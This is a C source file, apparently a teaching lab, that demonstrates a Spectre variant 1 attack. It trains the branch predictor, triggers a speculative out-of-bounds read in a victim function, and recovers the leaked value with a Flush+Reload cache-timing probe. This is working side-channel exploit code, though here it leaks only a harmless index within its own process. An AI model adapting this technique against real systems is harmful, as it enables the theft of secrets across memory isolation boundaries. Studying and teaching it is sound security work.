#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

int size = 10;
uint8_t array[256*4096];
uint8_t temp = 0;
#define CACHE_HIT_THRESHOLD (180)
#define DELTA 1024

void flushSideChannel()
{
  int i;
  
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++)
	 array[i*4096 + DELTA] = 1;
  
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) 
	_mm_clflush(&array[i*4096 +DELTA]);
}

void reloadSideChannel()
{
  int access=0;
  register uint64_t timebefore, timeafter;
  volatile uint8_t *addr;
  int i;
  
  for(i = 0; i < 256; i++){
  
   addr = &array[i*4096 + DELTA];
   
   timebefore = __rdtscp(&access);		 //Time Stamp Counter of CPU before memory read
   access = *addr;				 //Array element is accessed
   timeafter = __rdtscp(&access) - timebefore;  //Difference gives the time taken to access the array element
   
   if (timeafter <= CACHE_HIT_THRESHOLD){

	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
    }
  } 
}

void victim(size_t x)
{
  if (x < size) {  			//value of size is set to 10 
  temp = array[x * 4096 + DELTA];  
  }
}

int main() {
  int i;
 
  // FLUSH the probing array 
  
   flushSideChannel();			
 
  // Train the CPU for the true branch of the if condition inside victim()
  
   for (i = 0; i < 10; i++) {   
   _mm_clflush(&size); 		//The variable 'size' is flushed from the cache. If not, speculative execution will not be performed.
   victim(i);			//Passing a value that will make the if condition true in victim()
  }
  
  // Exploit the out-of-order execution
  
  _mm_clflush(&size);
  
  for (i = 0; i < 256; i++)
  	_mm_clflush(&array[i*4096 + DELTA]); //flushes all the blocks from cache
  
  victim(97);	//Trying to access value at index 97 by exploiting out-of-order execution. It's value will be loaded in the cache. 
  
  // RELOAD the array to use cache as side channel inorder to extract the secret index

  reloadSideChannel();
  return (0); 
}
